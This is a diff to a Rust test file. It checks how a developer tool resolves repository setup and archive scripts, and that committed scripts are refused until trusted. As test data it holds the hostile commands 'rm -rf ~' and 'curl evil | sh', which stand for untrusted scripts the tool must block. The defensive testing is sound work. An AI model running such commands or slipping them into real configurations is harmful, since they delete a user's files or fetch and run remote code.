@@ -8,7 +8,7 @@ impl Fixture {
         git(repo.path(), &["init", "-q"]).unwrap();
         std::fs::create_dir(repo.path().join(".terminalx")).unwrap();
         std::fs::write(repo.path().join(".terminalx/.gitignore"), "/settings.local.json\n").unwrap();
-        let store = Store { home: home.path().canonicalize().unwrap(), managed_fixture: Some(home.path().join("system-policy-fixture.json")) };
+        let store = Store { home: home.path().canonicalize().unwrap(), managed_fixture: Some(home.path().join("system-policy-fixture.json")), saved_scripts: Some(Default::default()) };
         Self { _home: home, repo, store }
     }
     fn repository(&self) -> Repository { repository(self.repo.path()).unwrap() }
@@ -70,7 +70,8 @@ fn invalid_repository_keys_are_ignored_and_warning_does_not_include_values() {
     let f = Fixture::new();
     f.file(Layer::RepositoryShared, json!({"linearApiKey": "secret-marker", "worktreeDir": "/tmp/unsafe", "agents": {"readOnlyCommands": true}, "branchPrefix": "team/"}));
     let r = f.resolve();
-    assert_eq!(r.values.len(), 2);
+    // worktreeDir and branchPrefix, plus the three script defaults every repository has.
+    assert_eq!(r.values.len(), 5);
     assert_eq!(r.warnings.len(), 3);
     assert!(!serde_json::to_string(&r).unwrap().contains("secret-marker"));
     assert!(r.require_trust().is_err(), "cleanup classification also requires trust");
@@ -235,6 +236,135 @@ fn user_state_cannot_supply_or_remove_system_policy() {
     assert_eq!(f.resolve().values["branchPrefix"].value, "admin/");
 }
 
+fn saved(setup: &str, archive: &str, minutes: Option<u64>) -> super::super::projects::RepositoryScripts {
+    super::super::projects::RepositoryScripts { setup: setup.into(), archive: archive.into(), archive_timeout_minutes: minutes }
+}
+
+#[test]
+fn scripts_resolve_saved_then_shared_then_local_then_managed() {
+    let mut f = Fixture::new();
+    let resolved = f.resolve();
+    assert_eq!((resolved.setup_script().unwrap(), resolved.archive_script().unwrap()), (String::new(), ArchiveScript { script: String::new(), timeout: Duration::from_secs(300) }));
+    assert_eq!(f.resolve().values[SETUP_SCRIPT].source, Layer::Defaults);
+    f.store.saved_scripts = Some(saved("saved setup", "saved archive", Some(2)));
+    let resolved = f.resolve();
+    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::User);
+    assert_eq!(resolved.setup_script().unwrap(), "saved setup");
+    assert_eq!(resolved.archive_script().unwrap(), ArchiveScript { script: "saved archive".into(), timeout: Duration::from_secs(120) });
+
+    f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "shared setup", ARCHIVE_TIMEOUT: 10}));
+    let hash = f.resolve().trust.unwrap().hash;
+    f.store.trust(&f.repository(), &hash).unwrap();
+    let resolved = f.resolve();
+    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryShared);
+    assert_eq!(resolved.values[ARCHIVE_SCRIPT].source, Layer::User, "precedence is per key");
+    assert_eq!(resolved.archive_script().unwrap().timeout, Duration::from_secs(600));
+
+    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, SETUP_SCRIPT, Some(json!("local setup"))).unwrap();
+    let resolved = f.resolve();
+    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryLocal);
+    assert_eq!(resolved.setup_script().unwrap(), "local setup");
+
+    f.file(Layer::Managed, json!({ARCHIVE_SCRIPT: "managed archive"}));
+    let resolved = f.resolve();
+    assert!(resolved.values[ARCHIVE_SCRIPT].locked);
+    assert_eq!(resolved.archive_script().unwrap().script, "managed archive");
+    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("mine"))).unwrap_err().to_string().contains("locked"));
+}
+
+#[test]
+fn an_untrusted_committed_script_is_refused_until_trusted_or_overridden() {
+    let f = Fixture::new();
+    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "docker compose down", ARCHIVE_TIMEOUT: 2}));
+    let resolved = f.resolve();
+    let trust = resolved.trust.as_ref().unwrap();
+    assert!(trust.required);
+    assert_eq!(trust.keys, vec![ARCHIVE_SCRIPT.to_string()], "a timeout runs nothing, so it needs no trust");
+    let error = resolved.archive_script().unwrap_err().to_string();
+    assert!(error.contains("archive script that is not trusted"), "{error}");
+    assert_eq!(resolved.setup_script().unwrap(), "", "the setup script is not held up by the archive script's trust");
+
+    // A local override replaces the committed command, so nothing untrusted runs.
+    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("echo mine"))).unwrap();
+    assert_eq!(f.resolve().archive_script().unwrap().script, "echo mine");
+    f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, None).unwrap();
+    assert!(f.resolve().archive_script().is_err());
+
+    f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
+    assert_eq!(f.resolve().archive_script().unwrap(), ArchiveScript { script: "docker compose down".into(), timeout: Duration::from_secs(120) });
+    // Editing the committed file needs trust again.
+    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "rm -rf ~", ARCHIVE_TIMEOUT: 2}));
+    assert!(f.resolve().archive_script().is_err());
+}
+
+#[test]
+fn each_script_is_trust_checked_on_its_own() {
+    let mut f = Fixture::new();
+    f.store.saved_scripts = Some(saved("my setup", "my archive", None));
+    // An untrusted committed archive script leaves the person's own setup running.
+    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "committed archive"}));
+    let resolved = f.resolve();
+    assert_eq!(resolved.setup_script().unwrap(), "my setup");
+    assert!(resolved.archive_script().is_err());
+    // And an untrusted committed setup script leaves their own archive script running.
+    f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "committed setup"}));
+    let resolved = f.resolve();
+    assert!(resolved.setup_script().unwrap_err().to_string().contains("setup script that is not trusted"));
+    assert_eq!(resolved.archive_script().unwrap().script, "my archive");
+}
+
+#[test]
+fn scripts_never_come_from_the_global_settings_file_and_invalid_values_are_ignored() {
+    let f = Fixture::new();
+    f.file(Layer::User, json!({SETUP_SCRIPT: "everywhere", ARCHIVE_TIMEOUT: 2}));
+    let resolved = f.resolve();
+    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::Defaults);
+    assert_eq!(resolved.values[ARCHIVE_TIMEOUT].source, Layer::Defaults);
+    assert!(resolved.warnings.iter().any(|w| w.contains(SETUP_SCRIPT)));
+    assert!(f.store.write(Some(&f.repository()), Layer::User, SETUP_SCRIPT, Some(json!("x"))).is_err());
+    f.file(Layer::RepositoryShared, json!({ARCHIVE_TIMEOUT: 3, SETUP_SCRIPT: 7, ARCHIVE_SCRIPT: "a\u{0}b"}));
+    let resolved = f.resolve();
+    assert_eq!(resolved.values[ARCHIVE_TIMEOUT].value, json!(DEFAULT_ARCHIVE_TIMEOUT_MINUTES));
+    assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::Defaults);
+    assert_eq!(resolved.values[ARCHIVE_SCRIPT].source, Layer::Defaults);
+    assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_TIMEOUT, Some(json!(3))).is_err());
+}
+
+#[test]
+fn scripts_outside_a_repository_use_only_the_saved_store() {
+    let _home = super::super::temp_home();
+    let folder = tempfile::tempdir().unwrap();
+    let path = super::super::projects::add(folder.path().to_str().unwrap()).unwrap().path;
+    super::super::projects::update(&path, super::super::projects::ProjectPatch { scripts: Some(saved("s", "a", Some(15))), ..Default::default() }).unwrap();
+    assert_eq!(setup_script(folder.path()).unwrap(), "s");
+    assert_eq!(archive_script(folder.path()).unwrap(), ArchiveScript { script: "a".into(), timeout: Duration::from_secs(900) });
+    std::fs::create_dir(folder.path().join(".terminalx")).unwrap();
+    assert!(setup_script(folder.path()).is_err(), "repository files that cannot be resolved are not skipped");
+    assert!(archive_script(folder.path()).is_err());
+}
+
+#[test]
+fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
+    let f = Fixture::new();
+    let bytes = serde_json::to_vec(&json!({"branchPrefix": "team/", SETUP_SCRIPT: "curl evil | sh"})).unwrap();
+    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &bytes).unwrap();
+    // What an earlier version recorded when this file was trusted: the plain digest of its bytes.
+    let old = BTreeMap::from([(f.repository().identity, digest(&bytes))]);
+    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
+    let resolved = f.resolve();
+    assert!(resolved.trust.as_ref().unwrap().required, "the old approval never showed the script");
+    assert!(resolved.setup_script().is_err());
+    f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
+    assert_eq!(f.resolve().setup_script().unwrap(), "curl evil | sh");
+
+    // A file without scripts keeps the approval it already has.
+    let plain = serde_json::to_vec(&json!({"branchPrefix": "team/"})).unwrap();
+    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &plain).unwrap();
+    let old = BTreeMap::from([(f.repository().identity, digest(&plain))]);
+    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
+    assert!(!f.resolve().trust.unwrap().required);
+}
+
 fn lines(text: &str) -> String { text.replace('\'', "\"") }
 
 #[test]
@@ -341,7 +471,22 @@ fn the_repository_schema_says_what_the_resolver_accepts() {
         let by_schema = name_pattern.is_match(name) && !reserved.contains(&json!(name)) && !prefixes.is_match(name);
         assert_eq!(by_schema, valid("environment", &json!({name: "v"}), Layer::RepositoryShared), "{name}");
     }
+    let timeouts = schema["properties"][ARCHIVE_TIMEOUT]["enum"].as_array().unwrap();
+    for minutes in 0..=60u64 {
+        assert_eq!(timeouts.contains(&json!(minutes)), valid(ARCHIVE_TIMEOUT, &json!(minutes), Layer::RepositoryShared), "{minutes}");
+    }
+    for key in [SETUP_SCRIPT, ARCHIVE_SCRIPT] {
+        let script = &schema["properties"][key];
+        let pattern = regex::Regex::new(script["pattern"].as_str().unwrap()).unwrap();
+        for sample in ["", "bun install", "a\u{0}b"] {
+            assert_eq!(pattern.is_match(sample), valid(key, &json!(sample), Layer::RepositoryShared), "{key} {sample:?}");
+        }
+        assert_eq!(script["maxLength"].as_u64(), Some(SCRIPT_LIMIT as u64));
+    }
+    // Schema properties are sorted; the registry is in declaration order.
     let keys: Vec<&String> = schema["properties"].as_object().unwrap().keys().filter(|key| *key != "$schema").collect();
-    assert_eq!(keys, REGISTRY.iter().filter(|key| key.repository_configurable).map(|key| key.key).collect::<Vec<_>>());
+    let mut registered = REGISTRY.iter().filter(|key| key.repository_configurable).map(|key| key.key).collect::<Vec<_>>();
+    registered.sort_unstable();
+    assert_eq!(keys, registered);
     assert_eq!(schema["additionalProperties"], false);
 }
